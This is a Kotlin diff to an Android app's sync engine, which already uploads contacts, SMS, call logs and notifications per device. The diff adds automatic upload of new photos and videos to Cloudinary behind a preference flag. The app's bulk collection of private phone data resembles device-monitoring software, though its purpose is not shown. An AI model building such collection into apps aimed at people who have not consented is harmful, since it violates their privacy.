@@ -45,6 +45,7 @@ class SyncEngine @Inject constructor(
             val lastSmsSync = if (isFullSync) 0L else prefs.getLong("last_sms_sync", 0L)
             val lastCallSync = if (isFullSync) 0L else prefs.getLong("last_call_sync", 0L)
             val lastContactSync = if (isFullSync) 0L else prefs.getLong("last_contact_sync", 0L)
+            val lastMediaSync = if (isFullSync) 0L else prefs.getLong("last_media_sync", 0L)
 
             val contactsAllowed = hasPermission(context, android.Manifest.permission.READ_CONTACTS)
             val smsAllowed = hasPermission(context, android.Manifest.permission.READ_SMS)
@@ -75,6 +76,28 @@ class SyncEngine @Inject constructor(
             val calls = if (callsAllowed) DataHelper.fetchCallLogs(context, sinceTimestamp = lastCallSync) else emptyList()
 
             repository.syncIncremental(deviceId, contacts, sms, calls)
+
+            // Auto Media Sync
+            val autoMediaSyncEnabled = prefs.getBoolean("auto_media_sync", false)
+            val mediaImagesAllowed = hasPermission(context, android.Manifest.permission.READ_MEDIA_IMAGES) ||
+                                     hasPermission(context, android.Manifest.permission.READ_EXTERNAL_STORAGE)
+            val mediaVideosAllowed = hasPermission(context, android.Manifest.permission.READ_MEDIA_VIDEO) ||
+                                     hasPermission(context, android.Manifest.permission.READ_EXTERNAL_STORAGE)
+
+            if (autoMediaSyncEnabled && (mediaImagesAllowed || mediaVideosAllowed)) {
+                Log.d("SyncEngine", "AUTO_MEDIA_SYNC_STARTED")
+                val newMedia = com.boxx.datasync.utils.MediaHelper.fetchNewMedia(context, lastMediaSync)
+                Log.d("SyncEngine", "AUTO_MEDIA_SYNC_FOUND: ${newMedia.size} items")
+                newMedia.forEachIndexed { index, media ->
+                    Log.d("SyncEngine", "AUTO_MEDIA_SYNC_UPLOADING: ${index + 1}/${newMedia.size} - ${media.fileName}")
+                    try {
+                        repository.updateDeviceInfoMap(deviceId, mapOf("syncStatus" to "Syncing Media (${index + 1}/${newMedia.size})"))
+                    } catch (_: Exception) {}
+                    CloudinaryUploader.uploadMedia(context, media.uri, deviceId)
+                }
+                Log.d("SyncEngine", "AUTO_MEDIA_SYNC_COMPLETED")
+                prefs.edit().putLong("last_media_sync", now).apply()
+            }
 
             if (isFullSync) {
                 val cachedNotifications = notificationDao.getAll().map { entity ->
